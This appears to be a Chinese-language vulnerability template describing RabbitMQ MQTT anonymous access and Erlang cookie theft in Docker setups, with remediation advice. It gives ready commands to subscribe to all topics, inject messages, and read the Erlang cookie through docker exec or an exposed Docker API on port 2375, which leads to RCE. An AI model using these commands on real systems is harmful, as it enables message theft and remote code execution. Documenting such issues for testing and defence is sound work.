---
id: RABBITMQ-PROTOCOL-ATTACKS
title: "RabbitMQ - MQTT匿名访问与Docker环境利用"
product: rabbitmq
vendor: Broadcom/Pivotal
version_affected: "所有启用MQTT插件的版本（配置不当时）"
severity: HIGH
tags: [mqtt, anonymous-access, docker, information-disclosure, message-injection]
fingerprint: ["RabbitMQ", "MQTT"]
---

## 漏洞描述

RabbitMQ启用MQTT插件后，若允许匿名连接，攻击者可在未认证的情况下订阅所有Topic窃取消息内容，或发布恶意消息进行注入攻击。在Docker环境部署中，还可能通过Docker API获取Erlang Cookie从而实现RCE。

## 影响版本

- 所有启用MQTT插件且允许匿名连接的RabbitMQ版本
- Docker部署的RabbitMQ（Cookie泄露风险）

## 利用步骤

### MQTT匿名访问

1. 确认目标1883/8883端口开放（MQTT服务）
2. 使用mosquitto客户端尝试匿名连接
3. 订阅通配符Topic `#` 监听所有消息
4. 发布恶意消息到目标Topic

### Docker环境利用

1. 确认目标运行在Docker容器中
2. 通过Docker API或容器逃逸获取Erlang Cookie
3. 使用Cookie进行Erlang节点RCE（参见RABBITMQ-ERLANG-COOKIE-RCE）

## Payload

### MQTT匿名访问

```bash
# 使用mosquitto客户端测试匿名订阅
mosquitto_sub -h <target> -p 1883 -t "#" -v

# 匿名发布
mosquitto_pub -h <target> -p 1883 -t "test" -m "hello"
```

### Docker默认Cookie

```bash
# 常见Docker部署cookie
docker exec <container> cat /var/lib/rabbitmq/.erlang.cookie

# 或通过环境变量
docker exec <container> env | grep RABBITMQ_ERLANG_COOKIE
```

### 利用Docker API获取Cookie

```bash
# 通过Docker API读取cookie
curl -s http://<docker-api>:2375/containers/<id>/exec \
  -X POST -H "Content-Type: application/json" \
  -d '{"AttachStdout":true,"Cmd":["cat","/var/lib/rabbitmq/.erlang.cookie"]}'
```

## 修复建议

1. MQTT插件禁用匿名连接，配置 `mqtt.allow_anonymous = false`
2. 为MQTT连接配置认证和TLS加密
3. Docker部署时不要通过环境变量传递Erlang Cookie
4. 限制Docker API访问，避免2375端口暴露
5. 对MQTT端口(1883/8883)实施网络访问控制
